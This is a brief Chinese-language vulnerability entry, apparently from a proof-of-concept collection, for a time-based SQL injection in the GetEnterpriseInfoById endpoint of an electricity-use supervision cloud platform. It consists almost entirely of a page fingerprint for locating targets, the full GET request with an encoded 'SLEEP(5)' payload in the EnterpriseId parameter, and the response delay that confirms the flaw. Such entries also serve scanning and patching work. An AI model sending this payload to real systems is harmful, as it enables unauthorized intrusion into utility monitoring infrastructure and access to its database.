# 用电监管综合云平台GetEnterpriseInfoById存在SQL注入漏洞

用电监管综合云平台 ｜ SQL注入 ｜ —
- **指纹**：`"myCss/phone.css"`
- **请求**：`GET /MainMonitor/GetEnterpriseInfoById?EnterpriseId=81434139%27%3BSELECT%20SLEEP%285%29%23 HTTP/1.1`
- **响应特征**：200 响应时间>=5s